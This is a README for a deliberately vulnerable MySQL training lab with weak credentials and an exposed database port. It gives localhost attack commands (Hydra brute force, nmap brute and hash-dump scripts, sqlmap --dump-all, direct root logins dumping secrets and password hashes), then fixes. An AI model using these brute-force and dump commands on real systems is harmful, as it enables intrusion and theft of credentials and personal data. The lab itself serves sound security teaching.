# Lab 20 — MySQL Weak Credentials + Direct DB Exposure 🔴

**Port:** `8020` (API) + **`3309`** (MySQL directly exposed!)  
**Stack:** Node.js + MySQL  
**Credentials:** `admin:admin` / root: `root:root`  
**Difficulty:** Beginner

---

## 🕳️ Security Loopholes

1. **Weak Credentials** — `admin:admin`, `root:root` trivially guessable
2. **MySQL Port Publicly Exposed** — Port `3309:3306` mapped, bypassing the API entirely
3. **Plaintext Sensitive Data** — Credit cards, SSNs, passwords stored unencrypted in DB
4. **Root Account Accessible** — `root:root` gives full DB control
5. **API Returns Raw DB Rows** — No field masking on sensitive columns

---

## 🎯 Attack Scenarios

### Scenario A — Direct MySQL Login
```bash
docker compose up -d

# Direct DB connection with weak credentials
mysql -h 127.0.0.1 -P 3309 -u admin -padmin weakdb

# SQL queries once connected:
SHOW TABLES;
SELECT * FROM users;          -- Dumps passwords, credit cards, SSNs
SELECT * FROM secrets;        -- AWS keys, Stripe keys
DESCRIBE users;

# Try root access
mysql -h 127.0.0.1 -P 3309 -u root -proot

# As root — access ALL databases
SHOW DATABASES;
SELECT User, Host, authentication_string FROM mysql.user;
```

### Scenario B — Automated Brute Force with Hydra
```bash
# Brute force MySQL credentials
hydra -L /usr/share/wordlists/usernames.txt \
      -P /usr/share/wordlists/rockyou.txt \
      127.0.0.1 \
      mysql -s 3309

# Targeted attack with common creds
hydra -l root -P /usr/share/wordlists/fasttrack.txt \
      127.0.0.1 mysql -s 3309
```

### Scenario C — Nmap MySQL Scan
```bash
# Scan and enumerate MySQL
nmap -sV -p 3309 --script mysql-info,mysql-brute,mysql-databases,mysql-dump-hashes \
  --script-args="mysql-brute.pass=/usr/share/wordlists/fasttrack.txt" \
  localhost

# Check for anonymous login
nmap -p 3309 --script mysql-empty-password localhost
```

### Scenario D — SQLmap Against Exposed DB
```bash
# Use sqlmap's direct MySQL connection feature
sqlmap -d "mysql://admin:admin@127.0.0.1:3309/weakdb" --dump-all --batch
```

### Scenario E — API Returns All PII
```bash
# API also leaks everything
curl http://localhost:8020/users      # Passwords, credit cards, SSNs
curl http://localhost:8020/secrets    # AWS keys, Stripe keys
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `mysql` client | `mysql -h 127.0.0.1 -P 3309 -u root -proot` |
| `hydra` | MySQL brute force |
| `nmap` | `nmap --script mysql-brute -p 3309 localhost` |
| Metasploit | `use auxiliary/scanner/mysql/mysql_login` |
| `sqlmap` | Direct DB connection mode |

---

## 🔐 How to Fix

```yaml
# docker-compose.yml — NEVER expose DB ports to host
services:
  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}  # Random 32-char from vault
      MYSQL_USER: ${DB_USER}
      MYSQL_PASSWORD: ${DB_PASS}
    # NO ports: mapping — internal network only
    networks: [internal]
```

```sql
-- Create a least-privilege user (only what the app needs)
CREATE USER 'appuser'@'%' IDENTIFIED BY 'StrongRandomPassword123!';
GRANT SELECT, INSERT, UPDATE ON appdb.users TO 'appuser'@'%';
-- NO DROP, DELETE, CREATE, or access to other DBs

-- Disable root remote login
DELETE FROM mysql.user WHERE User='root' AND Host != 'localhost';

-- Encrypt sensitive columns
ALTER TABLE users
  MODIFY credit_card VARBINARY(256),  -- AES_ENCRYPT before storing
  MODIFY ssn VARBINARY(256);
```

**Key principles:**
- Use strong, randomly generated passwords (min 20 chars)
- Never expose DB ports to public network
- Principle of least privilege — app DB user only has required permissions
- Hash passwords with bcrypt (never store plaintext)
- Mask/encrypt PII columns (credit cards, SSNs)
